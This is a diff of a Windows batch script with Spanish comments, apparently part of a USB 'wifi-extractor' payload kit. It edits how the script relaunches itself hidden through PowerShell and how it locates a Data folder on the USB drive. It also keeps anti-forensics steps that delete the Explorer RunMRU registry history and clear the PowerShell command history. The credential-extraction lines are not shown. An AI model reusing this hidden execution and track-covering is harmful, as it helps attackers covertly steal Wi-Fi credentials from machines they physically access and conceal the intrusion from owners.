@@ -3,21 +3,18 @@
 :: Ejecutarse en segundo plano si no lo esta
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
-    exit
+    exit /b 0
 )
 
 :: ====================================================
 ::               RESOLUCION DINAMICA DE UNIDAD
 :: ====================================================
-:: Resuelve la ruta directamente desde la ubicacion del script (0 ms, sin PowerShell)
 set "USB_ROOT=%~dp0"
-set "FOLDER_DATA=%USB_ROOT%Data"
-
-:: Si se ejecuta directamente desde la raiz del USB o desde payloads/wifi-extractor/
-if exist "%USB_ROOT%..\..\Data" (
-    set "FOLDER_DATA=%USB_ROOT%..\..\Data"
+if exist "%~dp0..\..\payloads" (
+    for %%I in ("%~dp0..\..") do set "USB_ROOT=%%~fI\"
 )
 
+set "FOLDER_DATA=%USB_ROOT%Data"
 if not exist "%FOLDER_DATA%" (
     mkdir "%FOLDER_DATA%" 2>nul
 )
@@ -47,4 +44,4 @@ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va 
 :: Limpia el historial de comandos de PowerShell
 powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1
 
-exit
+exit /b 0
